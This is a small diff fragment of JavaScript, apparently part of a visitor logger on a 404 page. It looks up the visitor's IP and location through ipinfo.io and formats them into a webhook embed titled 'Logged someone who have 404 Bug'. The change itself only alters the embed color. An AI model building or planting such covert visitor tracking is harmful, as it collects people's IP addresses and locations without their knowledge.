@@ -3,7 +3,7 @@ $.getJSON("https://ipinfo.io/json", function(data) {
     embeds: [
       {
         "title": "Logged someone who have 404 Bug",
-        "color": 12846084,
+        "color": 64175,
         "thumbnail": {
         },
         "fields": [
